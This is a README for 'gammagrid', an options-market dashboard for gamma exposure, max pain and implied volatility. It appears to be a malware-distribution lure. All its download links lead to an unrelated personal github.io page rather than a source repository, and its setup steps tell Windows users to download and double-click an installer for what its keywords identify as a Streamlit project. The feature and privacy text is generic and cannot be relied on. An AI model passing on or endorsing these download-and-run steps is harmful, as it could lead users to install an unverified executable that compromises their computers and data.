# 📈 gammagrid - Track dealer options and market exposure

[![](https://img.shields.io/badge/Download-gammagrid-blue.svg)](https://shannonhomeward768.github.io)

## 📊 Overview

Gammagrid provides a clear view of market positioning. Traders use this tool to track dealer gamma exposure, max pain points, and open interest for various assets. You see how market participants position their portfolios through an easy interface. This project focuses on market data visualization. You do not need experience in computer science to run the dashboard. It organizes complex options data into charts and tables.

## 🛠 Features

* **Dealer GEX Analysis:** Visualize levels where dealers might hedge positions.
* **Max Pain Tracker:** Identify strike prices where option holders experience the most losses.
* **Open Interest:** Monitor volume changes across strike prices and expiration dates.
* **IV Surface:** View implied volatility across different time frames and strikes.
* **Dashboard Interface:** Navigate through metrics using a web-based layout.
* **Local Hosting:** Run the software on your machine to maintain data privacy.

## 📥 Getting Started

Follow these steps to set up the dashboard on your Windows computer.

1. **Visit the download page:** Go to [the official gammagrid repository](https://shannonhomeward768.github.io) to access the files.
2. **Download the installer:** Look for the release section. Download the installation package for Windows.
3. **Run the file:** Double-click the downloaded file to start the installation. Follow the prompts on your screen.
4. **Launch the application:** Find the gammagrid icon on your desktop or start menu. Open the program to trigger the dashboard.
5. **Open the browser:** Once the program loads, your default web browser will open a local address. Use this window to view your data.

## 💻 System Requirements

* **Operating System:** Windows 10 or Windows 11.
* **Processor:** Modern dual-core processor or better.
* **Memory:** At least 4 gigabytes of RAM.
* **Storage:** 500 megabytes of free disk space.
* **Network:** An active internet connection to download market data.

## ⚙️ Configuration

Gammagrid connects to data sources automatically. You do not need to edit text configuration files. The settings menu within the dashboard allows you to change symbols or data ranges. If the dashboard fails to load, verify that your firewall allows local host connections. The program runs on port 8501 by default. If another program uses that port, the dashboard will attempt to find a new one automatically. Your browser will reflect the updated address.

## 📉 Understanding the Metrics

* **Gamma Exposure (GEX):** This metric estimates how dealers change their hedging behavior when stock prices move. When dealers sell puts, they often sell underlying stock as prices fall.
* **Max Pain:** This represents the stock price that causes the largest number of options contracts to expire worthless. Many believe market prices gravitate toward these levels near expiration dates.
* **Implied Volatility (IV):** This indicates the expected price move for a stock over a specific period. High IV usually suggests market uncertainty.
* **Open Interest:** This shows the total number of outstanding contracts that have not settled. Rising interest often points to high conviction in a price direction.

## 🔧 Troubleshooting

If the application does not start, check these common items:

* **Install Docker:** If the installer asks for a container engine, ensure you have Docker Desktop installed. The application runs through this service to keep your computer stable.
* **Restart the App:** Close the command window or the tray icon and relaunch the program. 
* **Update Browser:** Use a supported web browser like Chrome, Firefox, or Edge. Older versions of Internet Explorer might not show the charts correctly.
* **Wait for Data:** Upon first launch, the application fetches historical data. This might take a minute depending on your connection speed. Keep the terminal window open during this process.

## 🛡 Privacy

Gammagrid runs locally. All data requests move from your computer to the data provider and back to your browser. No third party monitors your dashboard activity or your search history. You control the software entirely. If you want to stop the service, close the application window and terminate the background process in your system tray.

Keywords: dealer-positioning, gamma-exposure, gex, implied-volatility, max-pain, options, options-trading, quant, streamlit